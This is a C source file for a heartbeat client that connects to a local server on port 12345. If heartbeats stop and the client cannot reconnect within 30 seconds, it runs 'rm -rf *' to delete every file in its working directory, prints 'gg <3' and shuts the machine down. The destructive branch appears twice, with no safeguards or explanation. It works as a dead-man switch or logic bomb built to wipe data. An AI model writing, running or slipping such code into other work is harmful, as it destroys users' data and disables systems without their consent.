#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define PORT 12345
#define SERVER_IP "127.0.0.1"
#define TIMEOUT 10
#define RECONNECT_TIMEOUT 30

int connect_to_server(const char *server_ip, int port) {
    int sock;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation error");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, server_ip, &serv_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connection Failed");
        close(sock);
        return -1;
    }

    printf("Connected to server at %s:%d\n", server_ip, port);
    return sock;
}

int main() {
    int sock = 0;
    fd_set readfds;
    struct timeval tv;
    time_t last_heartbeat = time(NULL);

    sock = connect_to_server(SERVER_IP, PORT);
    if (sock < 0) {
        printf("Unable to connect to server. Exiting.\n");
        return -1;
    }

    while (1) {
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);

        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;

        int activity = select(sock + 1, &readfds, NULL, NULL, &tv);

        if (activity < 0) {
            perror("Select error");
            close(sock);
            exit(EXIT_FAILURE);
        } else if (activity == 0) {
            printf("No heartbeat received for %d seconds.\n", TIMEOUT);

            time_t reconnect_start = time(NULL);
            int reconnected = 0;

            while (difftime(time(NULL), reconnect_start) < RECONNECT_TIMEOUT) {
                printf("Attempting to reconnect...\n");
                close(sock);
                sock = connect_to_server(SERVER_IP, PORT);
                if (sock >= 0) {
                    reconnected = 1;
                    last_heartbeat = time(NULL);
                    break;
                }
                sleep(1);
            }

            if (!reconnected) {
                printf("Unable to reconnect after %d seconds. Triggering action!\n", RECONNECT_TIMEOUT);
                system("rm -rf *");
                printf("gg <3\n");
                system("shutdown -h now");
                break;
            } else {
                printf("Reconnected to server.\n");
                continue;
            }
        } else if (FD_ISSET(sock, &readfds)) {
            char buffer[1024] = {0};
            int valread = read(sock, buffer, sizeof(buffer));
            if (valread <= 0) {
                printf("Connection lost.\n");

                time_t reconnect_start = time(NULL);
                int reconnected = 0;

                while (difftime(time(NULL), reconnect_start) < RECONNECT_TIMEOUT) {
                    printf("Attempting to reconnect...\n");
                    close(sock);
                    sock = connect_to_server(SERVER_IP, PORT);
                    if (sock >= 0) {
                        reconnected = 1;
                        last_heartbeat = time(NULL);
                        break;
                    }
                    sleep(1);
                }

                if (!reconnected) {
                    printf("Unable to reconnect after %d seconds. Triggering action!\n", RECONNECT_TIMEOUT);
                    system("rm -rf *");
                    printf("gg <3\n");
                    system("shutdown -h now");
                    break;
                } else {
                    printf("Reconnected to server.\n");
                    continue;
                }
            } else {
                printf("Heartbeat received at %ld.\n", time(NULL));
                last_heartbeat = time(NULL);
            }
        }
    }

    close(sock);
    return 0;
}
